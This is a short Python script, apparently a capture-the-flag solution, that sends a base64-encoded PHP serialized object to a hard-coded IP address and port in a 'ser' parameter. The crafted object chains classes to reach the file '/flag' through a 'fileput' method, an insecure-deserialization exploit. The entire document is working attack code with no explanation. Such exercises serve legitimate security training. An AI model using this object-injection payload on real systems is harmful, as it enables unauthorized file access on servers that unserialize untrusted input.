import httpx
from base64 import b64encode

payload = 'O:4:"cls1":2:{s:3:"cls";O:4:"cls2":2:{s:8:"filename";s:5:"/flag";s:3:"txt";s:0:"";}s:3:"arr";a:1:{i:0;s:7:"fileput";}}'

resp = httpx.get('http://129.204.78.34:20617', params={
    'ser': b64encode(payload.encode()).decode()
})

print(resp.text)
